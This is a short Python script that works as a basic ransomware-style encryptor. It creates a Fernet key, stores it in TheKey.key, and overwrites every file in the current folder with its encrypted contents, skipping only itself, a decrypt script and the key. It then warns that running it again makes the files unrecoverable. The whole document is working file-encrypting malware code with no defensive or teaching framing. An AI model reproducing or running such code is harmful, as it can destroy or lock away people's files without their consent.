import os
from cryptography.fernet import Fernet

secret_key = Fernet.generate_key()

if os.path.exists("TheKey.key"):
	with open("TheKey.key", 'rb') as f:
		secret_key = f.read()
	print("Well protected the encryption. No one can't repeat the encryption.")
else:
	with open("TheKey.key", 'wb') as f:
		f.write(secret_key)

code = Fernet(secret_key)

files = []

for i in os.listdir():
    if i == "encrypt.py" or i ==  "decrypt.py" or i == "TheKey.key":
        print(f"passed \'{i}\'")
        continue
    elif os.path.isdir(i):
        print(f"passed \'{i}\'")
        continue
    else:
        files.append(i)

for file in files:
    file_content = ""
    with open(file, 'rb') as f:
        file_content = f.read()
    with open(file, 'wb') as f:
        f.write(code.encrypt(file_content))
    print(f"/'{file}/' is encrypted!!!")

print("Don't open this file again!!!\nIf you open this file for the second time, your files will not be able to come back.")
input(". . . press enter to continue . . .")
        


